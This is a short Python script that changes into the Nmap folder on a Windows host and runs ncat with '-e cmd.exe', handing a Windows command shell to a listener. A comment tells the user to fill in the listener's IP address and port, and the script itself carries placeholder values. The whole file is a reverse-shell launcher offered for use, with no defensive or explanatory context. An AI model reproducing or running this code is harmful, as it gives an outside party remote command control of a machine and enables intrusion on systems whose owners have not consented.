import os

# Nmap must be installed in default location on host system
os.chdir("C:/Program Files (x86)/Nmap/")

# Input IP Address & Port Number where listener is set up 
os.system('cmd /k "ncat -nv 0.0.0.0 87 -e cmd.exe"')